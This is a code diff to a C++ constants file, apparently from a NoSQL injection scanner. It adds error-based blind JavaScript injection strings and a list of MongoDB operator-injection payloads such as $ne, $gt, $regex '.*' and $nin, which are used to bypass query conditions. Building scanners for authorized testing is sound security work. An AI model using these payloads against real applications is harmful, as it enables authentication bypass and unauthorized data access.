@@ -23,6 +23,27 @@ const std::vector<std::pair<std::string, std::string>> BooleanBlinds = {
     {" || 1==2", " || 1==1"},
     {" || 'a'=='b'", " || 'a'=='a'"},
     {" || 1==='1'", " || 1=='1'"},
-    {" || typeof 1 === 'string'", " || typeof 1 === 'number'"}};
+    {" || typeof 1 === 'string'", " || typeof 1 === 'number'"},
+
+    // 3. Error-Based Blinds (False condition crashes the server, True executes
+    // safely)
+    {" || (function(){throw new Error();})()", " || true"},
+    {" || nonexistent_variable_123", " || true"},
+    {" || (function(){var a = null; return a.b;})()", " || true"}};
+
+// For Operator Injection (Category 2)
+const std::vector<std::string> OperatorInjections = {
+    // Inequality & Comparisons
+    R"({"$ne": null})", R"({"$ne": ""})", R"({"$gt": ""})",
+
+    // Regex (matches everything)
+    R"({"$regex": ".*"})",
+
+    // Arrays
+    R"({"$nin": []})", R"({"$nin": [""]})",
+
+    // Type matching
+    R"({"$type": 2})" // Match any string
+};
 
 } // namespace Constants
